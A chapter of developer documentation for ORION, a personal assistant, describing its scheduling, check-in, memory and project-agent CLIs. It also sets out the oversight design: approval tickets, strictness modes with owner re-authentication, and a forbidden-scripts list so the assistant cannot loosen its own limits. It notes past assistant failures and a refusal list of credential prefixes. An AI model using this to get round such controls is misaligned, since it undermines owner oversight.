"What should Nick do right now, from his real day." Reads: today and tomorrow's blocks through `liveDay`, the last phone activity sample from `health-log.json` (`phoneSignals`, over 180 minutes old is ignored), open check-ins from `checkins.json`, learned `patterns`. Computes tonight's sleep plan: **wake = min(09:00, first fixed event tomorrow minus 75 min); bedtime = wake + 24 h - 8 h, never past midnight** (`scripts/orion-now:30-32`; before 06:00 "tomorrow" means today, `nightOf`). `sleepState`/`bedtimeNudge` (`lib/life/sleep-state.mjs`, `bedtime.mjs`) choose a nudge; `dailyNeeds` reports the missing side-project minutes (daily hour). Prints one line `It's HH:MM. DO|PREPARE|FREE: reason`, plus "No side-project time on the calendar yet today (N min short of the daily hour)", `Open check-ins: ...`, `Tonight: bed by HH:MM, up at HH:MM for X at HH:MM.`, and learned patterns. `--json` emits the structure (`{now, action, sleep:{state,bedtime,wake,reason}, nudge, sideProjectMissing, openCheckins, calendarProblem}`). `orion-morning` also shells out to `orion-now --json` to learn the planned wake time (`orion-morning:68`). Side effects: none.

#### `orion-life` (25 lines; allowlisted)
Nick's planning preferences, persisted in `life-config.json` (3.3). `orion-life` prints every key; `set <key> <value>` (validated by `VALIDATORS`, e.g. `set gymDays 1,3,5`, `set bedtime 00:30`, `set autoShrink false`, `set todoList Orion`); `min <name> <minutes>` ("naps at least 75 minutes, always": `min nap 75`; `0` removes it; name regex `^[a-z0-9][a-z0-9 '-]{1,39}$`, minutes 0-600); `rank <name> high|medium|low|none` (`rank gym high`). Unknown key or invalid value exits 2. This is how "remember that" for scheduling rules becomes **enforced** rather than a prose memory ("A prose memory alone is not enforcement", `SCHEDULING.md`; origin 2026-10-01: ORION answered "Noted" to "naps should be at least 75 minutes" and remembered nothing).

#### `orion-patterns` (43 lines; allowlisted; read-only)
Prints typical bedtime/wake from `health-log.json` `sleepLog` ("Going to bed"/"up" events), nights with phone use between 01:00 and 05:00, WHOOP sleep/recovery over the last 14 days (red day = recovery under 34), and "Starting things: ..." from `life-history.jsonl` via `lateness()`. Needs at least 3 logged nights to be meaningful.

#### `orion-quick` (52 lines)
One JSON line for the Option-Tab quick menu in the Mac app: `{"now":{title,until}|null,"next":{title,at,inMinutes}|null,"focusToday":"...","phone":"..."}`. Reads today's calendar (`liveDay`), `focus-history.jsonl` (`lib/focus/day-total.mjs`), and runs `orion-phone-time status` (5 s timeout). Anything failing becomes `null` rather than failing the menu. Called from `native/Orion/Sources/Orion/Console.swift:226`. Commit `c2e1824` 2026-10-07. `ORION_NOW` overrides the clock.

#### `orion-waiting` (20 lines; allowlisted; read-only)
Lists approval **tickets** with no grant yet and not expired: reads `~/.openclaw/orion-gate/approvals/{tickets,grants}/*.json` and prints `<id> — <action>: <summary> (expires in N min)`, then "Nick approves with: approve <id>". Built because ORION answered "no pending approvals" without looking (2026-09-29). It cannot approve anything. (This is the approval-gate inbox, not the "waiting on other people" list that `orion-standing` reads.)

**Questions.** (1) Why do `orion-next` and `orion-study` take a day *file* while `orion-now` reads the live calendar? (2) How is "bedtime" derived and how does the 09:00 cap interact with a late first class? (3) Why must `orion-life min nap 75` write to a file instead of memory?

---

### 3.7 The tickers: `orion-watch`, `orion-watches`, `orion-checkin`, `orion-morning`

These are what make ORION speak first. They are all **driven by the native apps' timers, not by cron or launchd** (3.11, 3.12).

#### `orion-watch` (199 lines; allowlisted for status; driver is the Mac app)

**What it is.** "ORION noticing the day without being asked." `orion-watch tick [--json]` is run by the ORION Mac app every 5 minutes (`native/Orion/Sources/Orion/LifeWatch.swift:17-18`, driven by the dashboard's ticker `DashboardView.swift:247`) from the installed copy of the script, because the app holds the Calendar permission. `status` prints today's state JSON. Test flags: `--at HH:MM` (pretend it is that time) and `--dry-run` (change/send nothing). In eval mode it prints "Watcher paused during evaluation." and exits (`scripts/orion-watch:34-35`).

**What one tick does, in order** (`:56-199`; "the day turns at 4 AM", `today` = date of now minus 4 h, `:47`):
1. Load `~/.openclaw/orion-controlled/watch.json` (keeps the last 7 days). Decide `awake`: a WHOOP-or-phone "up" signal today, or recovery recorded, or past `usualWake` (`:58-62`).
2. **Sweep reminders**: `sweep(bridge, config)` moves stray reminders from "Reminders" to the to-do list (quiet; failure never stops the tick) (`:66`).
3. Read the calendar (`calendarEvents` -> `toBlocks`). If unreadable: `day.calendar = "unreadable: ..."` and **ask nothing blind** (`:68-69`).
4. **Night markers**: compute wake and "asleep by" for yesterday/today/tomorrow from `night.mjs` plus actual WHOOP/phone evidence, write `night.json`; the Mac and phone day views draw them (`:70-99`).
5. **Class reminders**: `classReminders(blocks, {now, sent})` alerts (level 0), about ten minutes before class, never during class (`:104-106`).
6. **Short night** (once per day, before 13:00, when awake and slept under 6 h or got in after 02:00): `adjustForShortSleep` moves early heavy work later and adds a nap after the first class past noon, **done then told, with undo**; it writes the calendar through `applyPlan` and queues the alert "Short night (N h). ... Tell me "undo" if you'd rather keep the day as it was." (`:111-135`). Commit `6830e6d` (2026-10-05): travel home between classes and the short-night nap keeps his minimum.
7. `orion-tasks sweep` as a child (60 s timeout) each tick (`:140-144`); `orion-tasks plan` once each morning before 13:00 (120 s timeout) (`:148-154`).
8. **Morning brief** once, before 13:00, when awake and the calendar is ok: `morningBrief(...)` text, with deadlines from `list_deadlines` filtered to assessments (not holidays) (`:160-171`).
9. **Empty-day question**: if at least 3 free hours remain (`freeGaps`, minimum 30 min), ask once in the morning ("Morning. ... What's the plan? Anything fixed ... Tell me and I'll fill in the rest."), and again if he is within 45 minutes after his last class (`:174-189`).
10. Append every alert to `~/.openclaw/orion-controlled/alerts-outbox.jsonl` as `{id, level, text, kind:"checkin"}` (not with `--dry-run`); the phone-link app drains that file and sends each as a notification (`LinkEngine.swift:156-163`). Save state; `summarize(log)`.

**Contracts.** Output lines or `--json` array of alerts. Env: `ORION_WATCH_FILE`, `ORION_HEALTH_LOG`. Files read: `health-log.json`, `sleep-actual.json`, `night.json`, `wake-request.json`, `life-config.json`. Files written: `watch.json`, `night.json`, `alerts-outbox.jsonl`, `life-history.jsonl` (via `summarize`), calendar (short night only).

**History.** `37c29fd` (2026-09-30), `35e4889` / `017d51c` (2026-10-01 wake and asleep markers; the wake line moves to when he actually woke), `ae41446` (2026-10-02), `6830e6d` (2026-10-05), `e11dc82` (2026-10-06, orion-tasks), `6c93032` (2026-10-13 sweep per tick).

**Gotchas.** A tick failing in the app is silent (stdout/err to `/dev/null`). Alerts are only deduplicated by the `day.asked` list in `watch.json`. The nap logic writes to the real calendar without asking; that is a stated Nick preference ("He'll be too tired to be asked") (`:11-14`).

#### `orion-watches` (137 lines; allowlisted)

**What it is.** Standing watches that tell Nick something via `orion-reach` (the outreach CLI, see another chapter). Also driven by the Mac app right after `orion-watch tick` (`LifeWatch.swift:36-45`: `orion-watches tick`).

**Subcommands.**

| Command | Effect |
|---|---|
| `add weather "<phrase>"` | phrase forms: "rain tomorrow", "below 3", "snow", "wind", "above 25 today" (parsed by `parseWeatherWatch` in `lib/reach/triage.mjs`); stores `{id:"w-xxxxxx", ..., said, added}` in `watches.json` |
| `list` | watches (`w-xxxxxx  weather: rain tomorrow (told him 2026-10-12)`), gate on/off, mail on/off, "Always gets through" people |
| `remove <id>` | delete one watch |
| `people [add\|remove "<name or number>"]` | the allow-through list for the texts gate |
| `gate on\|off` | texts gate: while ON, new texts are read and only important ones relayed (his phone's "Gated Focus" silences the rest) |
| `mail on\|off` | important new email alerts (on by default) |
| `tick [--dry-run]` | one pass: weather (hourly check per watch, told once a day via `weatherHit`), texts (only while gate on; reads `messages-recent.json` exported by the Mac app, last 15 unseen), mail (every ~10 min via `orion-gmail-search --json --max 10 "in:inbox newer_than:1d -category:promotions ..."`; the first run only learns what is there) |

**Who decides "important".** `judge()` (`lib/reach/triage.mjs`). **Plugged in** (`pmset -g batt`), the local model `qwen3.5:9b` through Ollama at `http://127.0.0.1:11434/api/generate` is used for a 3-token verdict (`temperature 0`, `num_predict 3`, `think:false`, `keep_alive:"30m"`, 20 s timeout; usage logged to `local-usage.jsonl`) (`scripts/orion-watches:121-129`). **On battery**: only his important people and plainly urgent words, "never Claude, never a guess" (header `:16-17`). A hit spawns `orion-reach <text> --kind warning|update --why "<reason>"`. Dry-run prints `DRY RUN would tell him: ...`. State: `watches.json` (mode 0600; keeps `seen` ids, capped at 500). Commits `a139f4b` (2026-10-07 WIP presence-aware outreach), `562c9f1` (watches every 5 minutes, text export for the gate), `dce48ae`.

#### `orion-checkin` (188 lines; allowlisted)

**What it is.** ORION "coming back to check": "I'm starving, let me eat first" -> ORION gives 25 min, then returns ("Okay, you ate. Now we're starting."). Ignored, it escalates; started, it goes quiet and confirms it is still going; done or cancelled, it stops. State machine: `lib/life/follow-through.mjs` (pure; levels 0-4; escalation gaps `[10,10,5,5]` minutes; an "active" block gets a check at +25 min; legitimate deferrals clamp to 5-45 min and at most 2).

**Subcommands.**

| Command | Effect |
|---|---|
| `add <0-720 minutes> "<what>" [--because "<reason>"]` | new check-in `ci-xxxxxx` (what max 120 chars), due now+minutes. `--because` classified by `classifyDeferral`; if a "pause" (eating, shower, call, bathroom, laundry), a "returning" phrase is stored ("you ate", "you showered", ...) |
| `started [id]` / `started "<what>"` | he began; with nothing open it creates a quiet "still going?" loop. The first start of a pending check-in records a planned-vs-actual sample (`recordOutcome`) |
| `done [id]` | finished, closes it |
| `defer <minutes> [id] [--because "<reason>"] [--snooze]` | a real pause vs putting it off: legitimate if `--snooze` and first deferral, or the reason classifies as pause/change; otherwise it "reads as putting it off" and the loop gets firmer |
| `cancel [id] [--because ...]` | plans changed, no scolding |
| `list` | open check-ins with phase, level, next check time |
| `tick [--json]` | advance due loops and print alerts. Skips (cancels) any check-in whose text names a class/lecture/lab/macro/marketing; skips all during a real class (`inClass`); past `MAX_ALERTS = 8` it gives up ("I'll stop pinging about X ...") and records a "never started" outcome |

`[id]` defaults to the most recent open check-in. Escalation text by level (`message()`, `:66-78`): 1 "Time to start: X.", 2 "X — still not started. Start now; just the first five minutes.", 3 "It's been N min. X, now. Phone down.", 4 "You've been avoiding X for N min. Get up. We're doing it now." The tone is intentional (Nick asked for pressure) but `SCHEDULING.md` forbids nagging during classes.
**Driver.** The phone-link app (`LinkEngine`) runs `orion-checkin tick --json` every ~32 s (`ticks % 8` of a 4 s loop, `native/OrionLink/App/LinkEngine.swift:89`), turns each alert into a CloudKit alert record shown as an iPhone notification, and drains the `alerts-outbox.jsonl` file in the same pass (`:156-163`). The phone's "Started / 10 more min / Done" buttons call back into `orion-checkin started` / `defer 10 --snooze --because ...` and `orion-reschedule early block` (`:458-476`).
**Files.** `checkins.json` (0600, keeps 20), `life-history.jsonl`. Eval mode uses `eval-checkins.json` and `tick` prints nothing live.
**History.** `37c29fd` 2026-09-30, `ae41446` 2026-10-02.

#### `orion-morning` (119 lines; not on the exec allowlist; driven by the phone link)

**What it is.** "ORION says good morning when Nick is actually up" (2026-10-08). The phone only *reports* (charger unplugged, minutes of phone use after the alarm, ORION opened on the phone); the Mac decides. `native/OrionLink/App/LinkEngine.swift:447-455` runs `orion-morning signal <kind> --at <ISO>`.
**Subcommands.** `signal unplugged|used|up [--at ISO] [--dry-run]`; `preview` (what he would hear, nothing sent); `show` (put the morning screen up on the Mac, silent, by writing `morning-view.json` and `open -g orion://morning-screen`); `status` (whether today's briefing went out; reads `morning-sent.json`).
**What `signal` does.** `shouldBrief({signal, signalAt, now, wake, briefedToday})` from `lib/reach/morning.mjs` is the gate (once per morning, after or just before the alarm, before 13:00); `alarmClock()` prefers the alarm he actually asked for (`wake-request.json`) over the planner's wake (from `orion-now --json`). Every signal and its decision is appended to `morning.log` (`:72`). If it passes: show the screen, run `orion-lights on 100 warm` (LED strip), then `orion-reach <text> --kind morning --urgent --loud --listen --channel mac --why "morning: <reason>"` which speaks aloud on the Mac and listens for a few seconds. On a successful send it records `morning-sent.json` (keeps 14 days). In eval mode it prints "Not during an evaluation." (`:54`).
**Briefing content** (`gather()`, `:104-119`): the day (`liveDay`), commute walls, to-dos (due, booked, waiting), weather (`lib/reach/weather.mjs`), composed by `composeBriefing`/`buildView`. Commits `dce48ae`, `f1fe2b2`, `27242e0`, `2e27833`, `188afeb` (all 2026-10-08).

**Questions to ask your tutor (3.7).** (1) Why are the tickers driven by the Swift apps instead of cron/launchd, and what happens if the app is quit? (2) How does `orion-watch` avoid asking the same question twice in a day? (3) Why does `orion-watches` choose the local model only when plugged in? (4) Trace a phone "Started" tap through `LinkEngine` to `orion-checkin`. (5) What does `orion-morning` check before saying anything aloud?

---

### 3.8 The cron-shaped CLIs: `orion-standing` and `orion-daily`

#### `orion-standing` (853 lines; allowlisted; run hourly by OpenClaw cron)

**What it is.** "Orion's standing orders — the checks he runs unprompted, and the only place he is allowed to speak first" (header `scripts/orion-standing:2-4`). One rule: **say only what changed**. Silence is the normal outcome; nothing is printed when there is nothing worth sending, so a cron job can pipe stdout straight to a channel. Diagnostics go to stderr only under `--explain`. It is a *reader*: it writes nothing itself (its "stateless de-duplication" comment `:685-691` explains why: an event is only announced in the one cadence-wide band where it first crosses the 2-hour line).

**Modes and flags (all).**
Positional mode (default `auto`): `morning | evening | check | auto`. Value flags (`VALUE_FLAGS`, `:79`): `--now YYYY-MM-DDTHH:MM` (local wall clock only, no timezone, for tests; `:110-112`), `--every N` (cadence in minutes, 1-720, default 60; sets the width of the "entering the 2-hour band" window). Boolean flags (`:80`): `--explain` (source-by-source status on stderr), `--force` (ignore quiet hours), `--polish` (rewrite via local model), `--notify` (deliver through `orion-notify`). **The header documents only four of these; `--every` and `--notify` exist in code but not in the header** (docs lag code). Unknown `-x` option exits 2; more than one positional exits 2.

**Constants** (`:66-76`): quiet hours 23:00-08:00 (`QUIET_FROM/UNTIL`), morning hour 8, evening hour 21, imminent window 120 min, last call 20 min, early start before 09:00, `POOR_RECOVERY 33`, `SHORT_SLEEP_HOURS 6`, `MAX_LISTED 5`, health reading max age 18 h. `auto` picks `morning` when the clock hour is 8, `evening` when it is 21, else `check` (`:753-754`).

**What each mode reads and says.**

| Mode | Sources read | Findings |
|---|---|---|
| `morning` | calendar (via `orion-agenda upcoming`), Reminders (via `orion-agenda tasks`), `health-log.json`, `location.json`, `projects.json`, `waiting.json` | "Today: N commitment(s)" with up to 5 events and "First is in 1h 20m"; "Due: ..." for tasks due today or earlier; "Body: recovery 31, 5.2h sleep — ... Ease off the load." (only if a reading exists AND is under 18 h old); timezone/location drift; project milestones within 3 days or past due and unmarked; "Still waiting on N thing(s)" (open `waiting.json` items past `dueBy`, not snoozed, surfaced under 5 times); blind-spot notes for unavailable/degraded sources |
| `evening` | calendar, today's memory file `~/.openclaw/workspace/memory/<day>.md` (only the `## Noted` section), location | "Tomorrow starts at X — Y. That is an early one." (before 09:00) or, for a first event matching an explicit vocabulary (bring, passport, visa, appointment, interview, flight, deadline, exam, document, id, ticket, deposit, form), "Worth sorting out tonight"; unresolved commitment notes ("must", "need to", "due tomorrow" ... with no later note that reads as closure and shares at least two significant words); location drift |
| `check` | calendar only | `urgent` finding for an event that just crossed 2 hours away ("Starts in 1h 55m. Wrap up what you are on.") and again within the last-call band of 20 minutes |

**Three failure modes the code defends** (header `:12-30`): (1) "Nothing scheduled" when the truth is "no access": every source carries a status `ok | empty | unavailable | degraded | stale | skipped | no-metrics`, and unavailable sources are *reported as blind spots* (only in the once-a-day modes, because an hourly "Reminders is still not granted" is the nagging that gets an assistant muted); (2) numbers never given: recovery/sleep printed only if a real number is in the file AND stamped within 18 h; `--polish` runs the text past `gpt-oss:20b` and **rejects the rewrite if it contains any digit string the deterministic text lacked** (`:709-746`); (3) UTC dates: all day boundaries use `en-CA` local dates.

**Quiet hours.** Between 23:00 and 08:00 only `urgent` findings are spoken unless `--force` (`:795-798`): "A 6am flight still gets through at 5am".

**`--polish` prompt** (sent to `gpt-oss:20b` via Ollama `http://127.0.0.1:11434/api/generate`, `temperature 0.2`, 60 s timeout, `:709-746`):

> "Rewrite the following assistant notification so it reads naturally and briefly. Keep every fact, every name and every number exactly as given. Add nothing. Invent no times, no counts, no advice that is not already there. Reply with the rewritten notification only."

**Delivery (`--notify`).** Spawns `process.execPath scripts/orion-notify <blocked|milestone> standing-<mode> "<text>" [--urgent]` (`:827-842`); "Anything urgent is BLOCKED (it wants a human); everything else is a milestone". `orion-notify` owns quiet hours, de-dup and the hourly cap, so standing does not run a second rate limiter ("one throat to choke"). Without `--notify` it just prints.

**Spawning detail.** It runs `orion-agenda` with `process.execPath` (the node already running), not the shebang, because the gateway cron's minimal PATH has no `node` (`:152-157`). `ORION_STANDING_AGENDA` can point at a fixture; a bad path fails loudly.

**Parsing `orion-agenda` text.** `EVENT_LINE` and `TASK_LINE` regexes (`:179-183`) accept both a plain space and U+202F before AM/PM (two Node installs, different ICU builds). Unparseable event-like lines produce status `degraded` ("the agenda output format may have changed").

**Reads.** `~/.openclaw/orion-controlled/health-log.json`, `location.json`, `projects.json`, `waiting.json`; `~/.openclaw/workspace/memory/<day>.md`. **Writes.** none (stdout; optionally `orion-notify`).

**History.** `d9cf665` 2026-08-11 (the orion-* wrapper toolbelt), `50f7110` 2026-09-01 (batch-b: location and projects), `3f05780` 2026-09-03 (phases 60-70: waiting list).

**Gotchas.** Phase 62's "waiting on others" findings live here because the script "already runs hourly, already knows quiet hours, and already says only what changed" (`:486-497`); the store is written by the plugin's `waiting_*` actions (not by this script). Nothing in the hourly `check` mode may nag. Timezone drift detection mirrors `TimeZonePolicy.verdict` in the Swift app (`:366-368`).

**Walk it yourself.** `scripts/orion-standing check --explain --now 2026-10-14T09:00` (read-only; prints sources to stderr; no `--notify`); `sed -n 750,813p scripts/orion-standing`.

**Questions.** (1) Why does the script write nothing and how does it still avoid repeats? (2) What are the three failure modes in its header? (3) Why is blind-spot reporting restricted to morning/evening? (4) Why is `--polish` safe, and what does it reject?

#### `orion-daily` (211 lines; allowlisted; nightly via OpenClaw cron)

**What it is.** The end-of-day pass over the **task ledger** (`~/.openclaw/orion-controlled/task-ledger.jsonl`, an append-only record of every plugin action). It is **deliberately not a model call**: "A summariser that needs the gateway up, a model warm and a network reachable is a summariser that silently stops running some evening" (`scripts/orion-daily:10-14`). It counts and lists.

**Usage.** `orion-daily` (summarise yesterday, compress its raw rows), `orion-daily YYYY-MM-DD` (a specific day), `orion-daily --today` (today so far, no compression).

**How it works.** (1) Read ledger rows whose `createdAt` falls on the target *local* day (`dayOf`, `:55`). No rows: print "nothing in the ledger, no summary written", exit 0. (2) Count actions (from `row.graph.steps[].action`), verified steps, failures, refused validations. (3) Build Markdown: `N requests, M actions verified, K refused.`, `## What was done` (top 12 actions), `## Asked for` (up to 25 distinct `row.goal` strings, "the only free text kept"), `## Did not work` (up to 15 failures). (4) Splice into `~/.openclaw/workspace/memory/<day>.md` between the markers `<!-- orion-daily:begin — generated from the action ledger; edits inside this block are overwritten -->` and `<!-- orion-daily:end -->` (`:153`, `spliceBlock` `:158`); text outside the markers is "somebody's memory" and is preserved (the previous version overwrote the whole file and destroyed what ORION had journalled; `:127-139`). (5) Unless `--today`: gzip the day's rows to `~/.openclaw/orion-controlled/archive/ledger-<day>.jsonl.gz` and **remove those rows from the live ledger** using the same local-day rule (`:189-209`).

**Pairing.** `orion-remember` (below) writes into the `## Noted` section, which lives outside the generated block; `orion-standing evening` reads only that section.

**Scheduling.** Per `docs/learn/_fragments/raw/trace-proactive-nudge.md:199-200` and `scripts/orion-setup:391-409`: a single OpenClaw cron job `orion-daily-memory` at `10 2 * * *` runs `orion-daily && openclaw memory index` (summary, then re-index); the old 00:20 LaunchAgent `com.nickmadaio.orion.daily` was retired because "two schedulers did not add reliability; they split one transaction across owners" (the LaunchAgent consumed the ledger so the 02:10 run always found nothing). The plugin also exposes `daily_rollup` as an automation action (`plugin/orion-control/src/automation.ts:111-115`, risk "medium").

**History.** `154c3fb` 2026-08-04 (scripts Orion runs on his own: daily brief, voice enrollment, alerts), `08cfaa8` 2026-08-04 (operational scripts restored), `71d4581` 2026-08-11 (UTC bug: "filed every day's memory under a UTC date").

**Gotchas.** A summary of a day with no ledger rows is a no-op, so quiet days leave no file. Archived rows are removed from the live ledger, so `orion-why` can only explain *recent* runs.

**Questions.** (1) Why is it not a model call? (2) How does it avoid destroying notes ORION wrote into the same file? (3) What goes wrong with two schedulers for one pipeline?

---

### 3.9 The project family

Two unrelated things share the word "project":

- `orion-project` is Nick's **milestone tracker** for multi-day real-life events (a move). It is life-loop, read by `orion-standing`.
- `orion-projects`, `orion-project-agent`, `orion-project-queue`, `orion-project-run` belong to the **local project-agent** runtime (unattended local-model coding runs, `scripts/lib/agentic/*`, `scripts/orion-agent`). They are summarised here only so the names are not confused; see the agentic chapter for the runner itself.

#### `orion-project` (178 lines; allowlisted)
**What/why.** "Things that take more than a day, with dates attached." Orion could see a calendar event (a moment) and an open loop from today's notes (no date) and nothing in between; a six-day move with four fixed dates fell through that gap (`scripts/orion-project:5-11`). Registered as `scopeNotInManifest` because no manifest phase covers it. Explicitly *not* project management: no dependency graph, no assignee, no percent, no scheduling.
**Commands.** `list` (default; ANSI-coloured, next milestone marked `->`, `late` in red), `add <id> "Title" [--note "..."]`, `milestone <id> <YYYY-MM-DD> "What happens"`, `done <id> <YYYY-MM-DD>` (marks every milestone on that date done, stamps `doneOn`), `close <id>`. Exits 2 on bad input. Exports `nextMilestone` and `overdueMilestones`.
**Store.** `~/.openclaw/orion-controlled/projects.json` = `{projects:[{id,title,status,startedOn,note?,milestones:[{on,what,done,doneOn?}], closedOn?}]}`, 0600, atomic write. Refuses to run (exit 2) on an unreadable file rather than start an empty list. Read by `orion-standing morning` (`:442-482`): milestones within 3 days or late are reported, "Never silently roll a missed milestone forward".
**History.** `50f7110` 2026-09-01 only.

#### `orion-projects` (160 lines; JSON output; not allowlisted)
Local desktop **project library** for the agentic runner. Commands: `list`; `add PLAN [NAME]` (registers a plan, prints lint findings against `docs/agentic/PLAN_STANDARD.md`, never refuses the import); `refresh ID` (re-copy plan and briefs before first start); `rebrief ID` (after start: replace briefs of tasks not yet done); `preflight [--keep-display-on] [--nudge-minutes N] [--no-keep-awake]` (read-only keep-awake/battery/lid check); `launch ID (--until ISO_TIME | --until-stopped | <hours 0-12>) [--enable] [keep-awake flags]` (spawns a **detached** `serve` process; refuses if another project holds `active-project.lock`, `launch.lock`, `supervisor.lock` or `worker.lock`; refuses if execution is disabled unless `--enable`, which sets `enabled:true` in the agentic config); `serve ID ...` (internal: runs `orion-agent init`/`run`, writes `launch.json` receipts, posts a Discord alert on failure). Only an explicit launch creates or runs a worktree (header `:1-3`). Commit `490d991` 2026-09-30.

#### `orion-project-agent` (199 lines; JSON output; not allowlisted)
**Operator controls** for a running project: `[--project ID] status | settings | set-model worker|reviewer MODEL | pause | resume | stop | exterminate | alerts quiet|away | steer --revision N --text TEXT | resolve --revision N --id ESCALATION_ID --note TEXT`. Three ways to halt (header `:6-24`): **pause** (hold, keep lease), **stop** (finish the task in flight, end at a safe boundary, resumable), **exterminate** (abandon the in-flight generation now; a detached "reaper" `_reap` process SIGKILLs only the exact supervisor pid/boot/start-time after a 20 s grace (`ORION_EXTERMINATE_GRACE_SECONDS`, max 300), and only if the exterminate is still standing). Mutating steer/resolve require `--revision N` from `status` (the UI polls, the agent moves; a stale snapshot would act on a finished task); halts do not. Deliberately **cannot** start runs, approve reviews or clear leases (a control surface that can approve work is one a confused operator can use to approve unread work). `alerts quiet` batches deferrals into one silent digest, `away` sends each as it happens.

#### `orion-project-queue` (111 lines; not allowlisted)
Run several projects one after another (one at a time because of `active-project.lock`): `start <id|name> [...]` (writes `queue.json` under `~/.openclaw/orion-controlled/project-agent/`, spawns a detached `run` loop, first starts now), `status [--json]`, `cancel` (kills the runner; the running project keeps going). The loop launches each through `orion-projects launch <id> --until-stopped`, polls the pid every `ORION_QUEUE_POLL_MS` (default 30000), and **stops the whole queue if Nick stopped/paused/exterminated the previous project** ("a stop means stop, not 'skip to the next'", `:12-14`). Commit `b748c40` 2026-10-05.

#### `orion-project-run` (89 lines; allowlisted for the model)
The chat/phone front for the above (2026-10-06, `de9221b`): `list` (registered projects and `done/total tasks`), `start <name> [<name>...]` (one: `orion-projects launch <id> --until-stopped`; several: `orion-project-queue start`), `status`, `stop | pause | resume` (via `orion-project-agent --project ID <cmd>`). Boundaries (header `:12-14`): only already-registered projects (no new plans), **never `--enable`** (if local execution was switched off on the Mac it stays off until Nick turns it on there), always until-stopped. Name matching: exact id/name, then unique substring; ambiguous names are refused. Refuses to start while another is `running/paused/starting/awaiting_review`, and refuses already-completed ones. Test seam: `ORION_<NAME>_BIN` env vars choose the child binaries (`bin()` `:22`).

**Questions.** (1) Why does `orion-project` stay deliberately small, and who reads its file? (2) Differences between stop, pause and exterminate? (3) Why can the phone path never `--enable` local execution?

---

### 3.10 Memory and authority helpers (short form)

These are not planner tools, but they are the other CLIs the model calls most.

**`orion-remember` (117 lines; allowlisted).** "The one way Orion is allowed to write a memory." Exists because the `coding` tool profile has no file-write tool; asked to journal, the model improvised `exec` with a `cat >> ... <<EOF` heredoc, which missed the exec allowlist, fell to approval-on-miss and **hung the session for the full four-minute agent timeout** (observed 2026-08-09; header `:5-11`). `orion-remember "<text>"` appends `- HH:MM — <text>` under `## Noted` in `~/.openclaw/workspace/memory/<local day>.md` (creating the file or placing the section before the `orion-daily` block so the nightly rewrite cannot erase it); `orion-remember --user "<fact>"` appends `- <date> — <text>` to `~/.openclaw/workspace/USER.md`, "only for durable facts ... still true in six months, because that file is loaded into every session's startup context". Max 600 chars; control characters stripped; **secret-shaped strings refused** (`sk-`, `ghp_`, `xox*-`, `AKIA`, JWT shape). Append-only; cannot be given a path.

**`orion-recall` (137 lines; allowlisted).** "The one way Orion is allowed to look something up in his own memory." Runs `~/.openclaw/bin/openclaw memory search --max-results 12 "<query>"` (20 with `--all`; local embeddings, no cloud tokens), parses `<score> <file>:<range>` headers (`HEADER = /^\s*(\d+\.\d+)\s+(.+?):(\d+-\d+)\s*$/`, `:80`), drops diagnostic/probe/cron transcript noise from `sessions/` unless the query itself says diagnostic, strips YAML frontmatter, and prints **one block with at most 8 body lines** (`--all`: every candidate, 40 lines). Query max 300 chars. The `.+?` (not `\S+?`) in the header regex fixed a silent total failure once Obsidian-vault paths with spaces joined the index: every vault block was dropped and it printed "nothing in memory" for queries the index answered at 0.74 (`:66-78`). The model is told to call this with 3-8 distinct keywords and that "no result" IS the answer (`plugin/orion-control/src/exec-routing.ts:88-89`).

**`orion-note` (181 lines; allowlisted).** Writes notes into the Obsidian-style vault `~/Documents/orionBrain` (the copy OpenClaw indexes; not `~/Desktop/ORION/brain`, because launchd cannot read Desktop). `list [folder]`, `show "<title>"`, `write "<title>" --claim "one sentence" --body "..." --epistemic inference|source-derived|user-stated|observed [--source X] [--folder "50 Concepts"]`. Design constraint (header `:5-22`): `orion-recall` shows only the first eight body lines and no YAML, so provenance must be on a **body line**: line two is a stamp ("Unverified inference by Orion — not confirmed against a source", "Told to Orion by Nick", "Observed by Orion from a tool result", or "From <source>, read <date>."). `source-derived` requires `--source`; claim max 300 chars; titles cannot contain `/`, `..`, or start with `.`; credential shapes refused; an existing note is backed up as `<file>.bak-<ms>` before overwrite. Commit `52462f4` 2026-09-02.

**`orion-why` (124 lines; not on the exec allowlist; a human/diagnostic tool).** "Why?" answered from the record, never from the model (Phase 63: expose inputs, evidence, policy, provenance; no hidden chain-of-thought). Reads the task ledger and renders each run via the plugin's `explainRun`/`speakExplanation` (`scripts/lib/orion-plugin.mjs` loads the built plugin). `orion-why` (last run), `last N` (1-20), `<taskId>`, `--json`; `can|cannot <capability>` delegates to `orion-authority check <capability>`. Evidence strings are quoted from the verifier's records, never paraphrased. Commit `e701537` 2026-09-03.

**`orion-undo` (119 lines; human tool, not allowlisted).** Undo for **file** operations recorded in the task ledger (move, rename, copy, trash). `orion-undo` lists the last 15 undoable runs; `orion-undo <orion-xxxxxxxxxxxxxxxx> [--yes]` shows (and with `--yes` performs) the inverse steps in reverse order. Never clobbers (thing still where the ledger put it, nothing at the destination, no symlinks, both ends inside `$HOME` and outside `~/.openclaw`, `~/Desktop/ORION`, `~/Library`, `~/.ssh`); every undo appends to `undo-audit.jsonl`. **Not the calendar undo**: calendar changes use `orion-reschedule undo` (3.1). Commit `9855d99` 2026-09-26 (phases 40-52).

**`orion-mode` (351 lines; human only).** Sets the **strictness mode** (how much ORION has to ask): `contained` (reads run, everything else asks), `guarded` (the catalog's own levels; default), `open` (self-repair and calendar writes stop asking), `sovereign` (everything runs except the floor). Flags (`:104`): `--yes`, `--explain`, `--json`, `--for <90m|8h|1d, max 24h>`, `--reason`, `--until-changed`, `--never <action-or-tier>` (repeatable; may only *add* friction), `--clear-never`, `--within <dir>` (repeatable; scopes file actions). Relaxing needs `--yes`, an expiry (`--for`) or `--until-changed`, and **owner re-authentication (Touch ID or password)** through `lib/orion-reauth.mjs` (`:319-327`); tightening never asks (the panic direction stays one step). The "floor" no mode can lower: changing what ORION is allowed to do, reaching a person who is not Nick, anything irreversible. Writes `~/.openclaw/orion-gate/strictness.json`. **Absent from the exec allowlist and in `FORBIDDEN_SCRIPTS`** so ORION cannot run or edit it (`plugin/orion-control/src/selfrepair.ts:395-396`). Commits `0e0036d` 2026-09-02, `9855d99` 2026-09-26. See chapter 04 for the gate.

---

### 3.11 Who calls what

There are five distinct callers. Knowing which one matters because they run **different copies** of the script (3.0) with **different permissions**.

